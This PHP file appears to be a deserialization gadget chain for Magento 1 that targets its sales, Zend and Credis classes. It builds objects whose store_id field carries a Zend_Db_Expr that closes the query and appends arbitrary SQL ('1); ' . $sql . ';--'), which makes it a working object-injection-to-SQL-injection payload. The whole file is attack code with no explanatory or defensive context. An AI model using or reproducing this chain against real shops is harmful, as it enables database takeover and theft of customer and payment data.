<?php

class Credis_Client
{
    protected $redis;
    protected $connected;

    public function __construct($redis)
    {
        $this->connected = true;
        $this->redis = $redis;
    }
}

class Mage_Sales_Model_Order_Payment_Transaction
{
    protected $_isFailsafe;
    protected $_paymentObject;
    protected $_data;
    protected $_resourceName;
    protected $_idFieldName;

    public function __construct($sql)
    {
        $this->_isFailsafe = true;
        $this->_paymentObject = new Mage_Sales_Model_Order_Payment;
        $this->_data = [
            'order_id' => 1,
            'store_id' => new Zend_Db_Expr('1); ' . $sql . ';--')
        ];
        $this->_resourceName = 'log/log';
        $this->_idFieldName = 'id';
    }
}

class Zend_Db_Expr
{
    protected $_expression;

    public function __construct($expression)
    {
        $this->_expression = $expression;
    }
}

class Mage_Sales_Model_Order_Payment
{
    protected $_idFieldName;

    public function __construct()
    {
        $this->_idFieldName = 'id';
    }
}
